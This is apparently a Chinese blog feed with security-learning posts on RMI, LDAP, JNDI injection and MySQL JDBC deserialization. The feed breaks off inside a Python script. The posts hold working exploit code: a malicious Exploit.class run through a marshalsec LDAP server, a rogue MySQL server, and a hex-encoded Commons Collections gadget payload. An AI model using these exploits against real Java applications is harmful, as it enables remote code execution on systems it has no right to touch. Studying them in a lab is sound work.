1089</span><br><span class="line">ldap:  java -cp mar*.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1:80/\#Exploit 1089</span><br></pre></td></tr></table></figure><p>所以说咱复现的时候其实用工具起服务器会更加方便一点儿</p><p>参考文章：</p><ul><li><a href="https://xz.aliyun.com/t/6633#toc-7">https://xz.aliyun.com/t/6633#toc-7</a></li><li><a href="https://evilpan.com/2021/12/13/jndi-injection/#ldap-1">https://evilpan.com/2021/12/13/jndi-injection/#ldap-1</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;JNDI注入&quot;&gt;&lt;a href=&quot;#JNDI注入&quot; class=&quot;headerlink&quot; title=&quot;JNDI注入&quot;&gt;&lt;/a&gt;JNDI注入&lt;/h1&gt;&lt;p&gt;前面做了做铺垫，这篇文章就来正式进入&lt;code&gt;jndi&lt;/code&gt;注入的学习，其实也不算特别难，就是链子有点儿长，得耐心下来&lt;/p&gt;</summary>
    
    
    
    
    <category term="Java" scheme="https://arsenetang.github.io/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>Java篇之RMI &amp; LDAP</title>
    <link href="https://arsenetang.github.io/2022/03/20/Java%E7%AF%87%E4%B9%8BRMI&amp;LDAP/"/>
    <id>https://arsenetang.github.io/2022/03/20/Java%E7%AF%87%E4%B9%8BRMI&amp;LDAP/</id>
    <published>2022-03-19T16:00:00.000Z</published>
    <updated>2022-03-20T07:41:44.355Z</updated>
    
    <content type="html"><![CDATA[<h1 id="RMI-amp-LDAP"><a href="#RMI-amp-LDAP" class="headerlink" title="RMI &amp; LDAP"></a>RMI &amp; LDAP</h1><p>这篇文章来总结两个基础知识，<code>rmi</code>和<code>ldap</code>，内容比较简单，为后面的<code>jndi</code>和<code>fastjson</code>做个铺垫</p><span id="more"></span><h2 id="RMI"><a href="#RMI" class="headerlink" title="RMI"></a>RMI</h2><p>RMI<code>(Remote Method Invocation)</code>，即Java远程方法调用，一种用于实现<a href="https://zh.m.wikipedia.org/wiki/%E8%BF%9C%E7%A8%8B%E8%BF%87%E7%A8%8B%E8%B0%83%E7%94%A8">远程过程调用</a>的<a href="https://zh.m.wikipedia.org/wiki/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E7%BC%96%E7%A8%8B%E6%8E%A5%E5%8F%A3">应用程序编程接口</a>，它使客户机上运行的程序可以通过网络实现调用远程服务器上的对象，要实现<code>RMI</code>，客户端和服务端需要共享同一个接口，先来看看服务端：</p><p>接口：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> rmidemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">evil</span> <span class="keyword">extends</span> <span class="title">Remote</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">evil</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实现类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> rmidemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">eviltest</span> <span class="keyword">extends</span> <span class="title">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title">evil</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="title">eviltest</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">evil</span><span class="params">()</span>  <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>服务端：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> rmidemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">rmiserver</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line"></span><br><span class="line">        LocateRegistry.createRegistry(<span class="number">1089</span>);</span><br><span class="line">        evil evil = <span class="keyword">new</span> eviltest();</span><br><span class="line">        Naming.rebind(<span class="string">&quot;rmi://127.0.0.1:1089/evil&quot;</span>, evil);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后我们在kali中编写客户端，因为要实现远程方法调用嘛，那就相当于用我的虚拟机去调我的真机，这里有个细节就是客户端的包名也要和服务端的相同；接口代码和服务端是一样的：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> rmidemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">rmiclienr</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        evil evil = (evil) Naming.lookup(<span class="string">&quot;rmi://10.24.38.47:1089/evil&quot;</span>);</span><br><span class="line">        evil.evil();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行这段代码，真机弹出计算器：</p><p><img src="https://s2.loli.net/2022/03/20/3FgmhIHoMZOTrGJ.png" alt="image.png"></p><p>上面这个例子，就为我们展现了一个很简单的rmi远程通信，接下来来总结总结：</p><p>一个<code>RMI</code>的服务器分为三部分，首先是一个继承了<code>java.rmi.Remote</code>的接口，里面有我们要远程调用的方法；然后是一个实现了该接口的类；最后是一个主类，首先创建并运行<code>RMI Registry</code>，然后将实现类对象绑定到<code>evil</code>这个名字上，这就是<code>RMI</code>服务器</p><p><code>RMI</code>的客户端就非常简单了，利用<code>Naming.lookup</code>方法在地址中去寻找我们绑定的对象，然后将这对象返回，接下来就和本地用法一样了</p><p>偷一张p神的图就把这些关系说清楚了：</p><p><img src="https://s2.loli.net/2022/03/20/wLiGJNSo2DaM5V3.png" alt="image.png"></p><p><code>RMI Registry</code>就像⼀个⽹关，他⾃⼰是不会执⾏远程⽅法的，但<code>RMI Server</code>可以在上⾯注册⼀个<code>Name</code>到对象的绑定关系；<code>RMI Client</code>通过<code>Name</code>向<code>RMI Registry</code>查询，得到这个绑定关系，然后再连接<code>RMI Server</code>；最后，远程⽅法实际上在<code>RMI Server</code>上调⽤，很清晰</p><h2 id="LDAP"><a href="#LDAP" class="headerlink" title="LDAP"></a>LDAP</h2><p>LDAP<code>(Lightweight Directory Access Protocol)</code>，轻型目录访问协议，是一个开放的，中立的，工业标准的<a href="https://zh.wikipedia.org/w/index.php?title=%E5%BA%94%E7%94%A8%E5%8D%8F%E8%AE%AE&action=edit&redlink=1">应用协议</a>，通过<a href="https://zh.wikipedia.org/wiki/IP%E5%8D%8F%E8%AE%AE">IP协议</a>提供访问控制和维护分布式信息的<a href="https://zh.wikipedia.org/wiki/%E7%9B%AE%E5%BD%95_(%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F)">目录</a>信息。</p><p>其实<code>ldap</code>的流程与上面的<code>rmi</code>基本一致，它主要能储存以下<code>Java</code>对象：</p><ol><li>Java serializable objects</li><li>Referenceable objects and JNDI References</li><li>Objects with attributes (DirContext)</li><li>RMI (Java Remote Method Invocation) objects (including those that use IIOP)</li><li>CORBA objects</li></ol><p>而这里我们主要用的是第二点，也就是<code>Reference</code>对象，这个讲<code>jndi</code>的时候再来讲，不慌</p><p>这里我们来推荐一个工具，<code>marshalsec</code>，<code>marshalsec</code>是一个快速搭建恶意的<code>rmi</code>或者<code>ldap</code>服务器的工具</p><p>下载地址：<a href="https://github.com/RandomRobbieBF/marshalsec-jar">https://github.com/RandomRobbieBF/marshalsec-jar</a></p><p>我们首先把编译好的恶意类<code>Exploit.class</code>放到web根目录下面，这里我直接放在<code>WWW</code>目录下面了，打开<code>phpstudy</code>就能访问了</p><p>恶意类的源码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Name;</span><br><span class="line"><span class="keyword">import</span> javax.naming.spi.ObjectFactory;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exploit</span> <span class="keyword">implements</span> <span class="title">ObjectFactory</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.err.println(<span class="string">&quot;success&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            String cmd = <span class="string">&quot;calc.exe&quot;</span>;</span><br><span class="line">            Runtime.getRuntime().exec(cmd);</span><br><span class="line">            </span><br><span class="line">            Runtime runtime = Runtime.getRuntime();</span><br><span class="line">            Process process = runtime.exec(<span class="string">&quot;cmd.exe /c dir&quot;</span>);</span><br><span class="line">            InputStream inputStream = process.getInputStream();</span><br><span class="line">            BufferedReader br = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(inputStream, <span class="string">&quot;gb2312&quot;</span>));</span><br><span class="line">            <span class="keyword">while</span>(br.readLine()!=<span class="keyword">null</span>)</span><br><span class="line">                System.out.println(br.readLine());</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> ( Exception e ) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">getObjectInstance</span><span class="params">(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里看起来有点儿复杂，因为我想执行个<code>dir</code>目录并且看到回显，这在Java中显得有点儿费劲</p><p>然后用<code>marshalsec</code>搭建<code>ldap</code>服务：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp mar*.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1:80/\#Exploit 1089</span><br></pre></td></tr></table></figure><p>最后来写个客户端，这个简单，就两行代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ladp</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">        Object object=<span class="keyword">new</span> InitialContext();</span><br><span class="line">        ((InitialContext) object).lookup(<span class="string">&quot;ldap://127.0.0.1:1089/Exploit&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/03/20/7WZGMkJ9ULPsnej.png" alt="image.png"></p><p><img src="https://s2.loli.net/2022/03/20/h7rC1ns2w8RWquJ.png" alt="image.png"></p><p>水文一篇哈哈哈，最近学的有点儿散，打脑壳得很</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;RMI-amp-LDAP&quot;&gt;&lt;a href=&quot;#RMI-amp-LDAP&quot; class=&quot;headerlink&quot; title=&quot;RMI &amp;amp; LDAP&quot;&gt;&lt;/a&gt;RMI &amp;amp; LDAP&lt;/h1&gt;&lt;p&gt;这篇文章来总结两个基础知识，&lt;code&gt;rmi&lt;/code&gt;和&lt;code&gt;ldap&lt;/code&gt;，内容比较简单，为后面的&lt;code&gt;jndi&lt;/code&gt;和&lt;code&gt;fastjson&lt;/code&gt;做个铺垫&lt;/p&gt;</summary>
    
    
    
    
    <category term="Java" scheme="https://arsenetang.github.io/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>Java篇之jdbc反序列化</title>
    <link href="https://arsenetang.github.io/2022/03/19/Java%E7%AF%87%E4%B9%8Bjdbc%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>https://arsenetang.github.io/2022/03/19/Java%E7%AF%87%E4%B9%8Bjdbc%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2022-03-18T16:00:00.000Z</published>
    <updated>2022-03-19T07:46:41.507Z</updated>
    
    <content type="html"><![CDATA[<h1 id="jdbc反序列化"><a href="#jdbc反序列化" class="headerlink" title="jdbc反序列化"></a>jdbc反序列化</h1><p>这几天有点儿痛苦，看完了p神的<code>Java</code>安全漫谈之后有点儿迷茫，<code>jndi</code>看了看，<code>fastjson</code>看了看，<code>jdbc</code>也看了看，但感觉都看的不太细，很多东西也没搞明白，写文章感觉有点儿难受，所以说一周多都没更了，接下来就慢慢学着慢慢总结着吧，先来看看<code>jdbc</code>反序列化</p><span id="more"></span><h2 id="jdbc是啥"><a href="#jdbc是啥" class="headerlink" title="jdbc是啥"></a>jdbc是啥</h2><p><code>JDBC(Java DataBase Connectivity)</code>，是<code>Java</code>与<code>DataBase</code>之间的桥梁，通俗来说，就是利用<code>Java</code>连接数据库的一种方法；是<code>Java</code>语言中用来规范客户端程序如何访问数据库的应用程序接口，提供了诸如查询和更新数据库中数据的方法，能够执行<code>SQL</code>语言；各种关系型数据库都有相应的方法来实现，但这篇文章我们只针对<code>MYSQL</code>数据库哈</p><h2 id="连接本地数据库"><a href="#连接本地数据库" class="headerlink" title="连接本地数据库"></a>连接本地数据库</h2><p>我们先来看看用<code>Java</code>如何连接本地的数据库，以及如何执行<code>SQL</code>语句</p><p>首先我们需要利用<code>Class.forName()</code>方法来加载<code>JDBC</code>驱动程序(driver)，这个不同的版本是不一样的，比如说新版本中<code>com.mysql.jdbc.Driver</code>就已经被弃用了，我们得用新的驱动<code>com.mysql.cj.jdbc.Driver</code></p><p>然后利用<code>DriverManager</code>中的<code>getConnection</code>方法，通过<code>JDBC url</code>，用户名，密码来连接相应的数据库</p><p>而<code>JDBC url</code>的格式是：<code>jdbc:mysql://host:port/database_name?参数1=value1&amp;参数2=value2...</code></p><p>加入要连接本地的<code>security</code>数据库就是：<code>jdbc:mysql://127.0.0.1:3306/security?serverTimezone=UTC</code>，后面那个参数是为了改变时区</p><p>在获取<code>Connection</code>之后，便可以创建<code>Statement</code>用以执行SQL语句，随便来看个查询<code>select * from users</code>，所以说代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.sql.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Class.forName(<span class="string">&quot;com.mysql.cj.jdbc.Driver&quot;</span>);</span><br><span class="line">        String jdbc_url = <span class="string">&quot;jdbc:mysql://127.0.0.1:3306/security?serverTimezone=UTC&quot;</span>;</span><br><span class="line">        Connection con = DriverManager.getConnection(jdbc_url, <span class="string">&quot;root&quot;</span>, <span class="string">&quot;root&quot;</span>);</span><br><span class="line">        Statement stmt = con.createStatement();</span><br><span class="line">        ResultSet rs = stmt.executeQuery(<span class="string">&quot;select * from users&quot;</span>);</span><br><span class="line">        <span class="keyword">while</span>(rs.next()) &#123;</span><br><span class="line">            System.out.println(rs.getString(<span class="string">&quot;id&quot;</span>) + <span class="string">&quot; : &quot;</span> + rs.getString(<span class="string">&quot;username&quot;</span>)+<span class="string">&quot;  &quot;</span>+rs.getString(<span class="string">&quot;password&quot;</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果如下：</p><p><img src="https://s2.loli.net/2022/03/17/omXgt9w2cBJSpvM.png" alt="image.png"></p><h2 id="连接远程数据库"><a href="#连接远程数据库" class="headerlink" title="连接远程数据库"></a>连接远程数据库</h2><p>接下来我们来看看远程的数据库，也就是<code>vps</code>上的<code>MYSQL</code>服务器，连接代码不变，就改改地址就行，主要是这要解决几个配置问题：</p><p>首先是需要打开服务器上的3306端口，在控制台打开就行</p><p>然后就是由于<code>Mysql</code>的安全配置，很可能会拒绝我们的连接请求，我们先来看看服务端Mysql端口的监听情况</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -ntlp | grep 3306</span><br></pre></td></tr></table></figure><p>看看<code>Local Address</code>，只有<code>127.0.0.1:3306</code>的话，说明<code>Mysql</code>服务端仅监听来自本机3306端口上的数据库请求，这样肯定是不行的</p><p>所以说，我们得先进到mysql目录下，我的是<code>/etc/mysql</code>，搜索哪里有绑定127.0.0.1的网址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -nr &quot;127.0.0.1&quot;</span><br></pre></td></tr></table></figure><p>然后进到该文件中，将<code>bind-address</code>那一行注释掉就好了，然后重启mysql服务，再查看一下3306端口的监听情况以确定修改成功与否</p><p><img src="https://s2.loli.net/2022/03/17/aYnOeP97GlHAykM.png" alt="image.png"></p><p>这样子就好了，远程就能连上了</p><p><img src="https://s2.loli.net/2022/03/17/6cxfhlikoad1LmS.png" alt="image.png"></p><p>如果还有啥问题，请参考：<a href="https://www.cnblogs.com/chorm590/p/9968475.html">https://www.cnblogs.com/chorm590/p/9968475.html</a></p><h2 id="jdbc反序列化原理"><a href="#jdbc反序列化原理" class="headerlink" title="jdbc反序列化原理"></a>jdbc反序列化原理</h2><p>既然我们可以通过<code>Java</code>连接数据库了，那么假如<code>JDBC url</code>可控，我们就可以让它连接任意<code>Mysql</code>服务器了，如果服务器中再存在反序列化漏洞，我们就可以设置一个恶意的<code>Mysql</code>服务器，通过<code>ObjectInputStream.readObject()</code>的反序列化攻击从而RCE</p><p>就是说咱通过<code>JDBC</code>连接数据库的时候，会有几个内置的<code>SQL</code>语句会被执行，而其中两个查询的结果集在<code>MySQL</code>客户端被处理时会调用<code>ObjectInputStream.readObject()</code>进行反序列化操作，如果攻击者搭建恶意<code>MySQL</code>服务器来控制这两个查询的结果集，并且攻击者可以控制JDBC连接设置项，那么就能触发MySQL JDBC客户端反序列化漏洞</p><p>而这个内置的<code>SQL</code>语句就是：<code>SHOW SESSION STATUS</code>和<code>SHOW COLLATION</code></p><h2 id="本地测试"><a href="#本地测试" class="headerlink" title="本地测试"></a>本地测试</h2><p>那我们先本地测一测，首先在<code>vps</code>上起一个恶意<code>Mysql</code>服务器，代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">greeting_data=<span class="string">&quot;4a0000000a352e372e31390008000000463b452623342c2d00fff7080200ff811500000000000000000000032851553e5c23502c51366a006d7973716c5f6e61746976655f70617373776f726400&quot;</span></span><br><span class="line">response_ok_data=<span class="string">&quot;0700000200000002000000&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">receive_data</span>(<span class="params">conn</span>):</span></span><br><span class="line">    data = conn.recv(<span class="number">1024</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Receiveing the package : &#123;&#125;&quot;</span>.<span class="built_in">format</span>(data))</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(data).lower()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_data</span>(<span class="params">conn,data</span>):</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Sending the package : &#123;&#125;&quot;</span>.<span class="built_in">format</span>(data))</span><br><span class="line">    conn.send(binascii.a2b_hex(data))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_payload_content</span>():</span></span><br><span class="line">    <span class="comment">#file文件的内容使用ysoserial生成的 使用规则：java -jar ysoserial [Gadget] [command] &gt; payload</span></span><br><span class="line">    file= <span class="string">r&#x27;payload&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> os.path.isfile(file):</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(file, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            payload_content = <span class="built_in">str</span>(binascii.b2a_hex(f.read()),encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;open successs&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;open false&quot;</span>)</span><br><span class="line">        <span class="comment">#calc</span></span><br><span class="line">        payload_content=<span class="string">&#x27;aced0005737200116a6176612e7574696c2e48617368536574ba44859596b8b7340300007870770c000000023f40000000000001737200346f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6b657976616c75652e546965644d6170456e7472798aadd29b39c11fdb0200024c00036b65797400124c6a6176612f6c616e672f4f626a6563743b4c00036d617074000f4c6a6176612f7574696c2f4d61703b7870740003666f6f7372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e7471007e00037870767200116a6176612e6c616e672e52756e74696d65000000000000000000000078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007400096765744d6574686f647571007e001b00000002767200106a6176612e6c616e672e537472696e67a0f0a4387a3bb34202000078707671007e001b7371007e00137571007e001800000002707571007e001800000000740006696e766f6b657571007e001b00000002767200106a6176612e6c616e672e4f626a656374000000000000000000000078707671007e00187371007e0013757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b4702000078700000000174000463616c63740004657865637571007e001b0000000171007e00207371007e000f737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b020000787000000001737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000077080000001000000000787878&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> payload_content</span><br><span class="line"></span><br><span 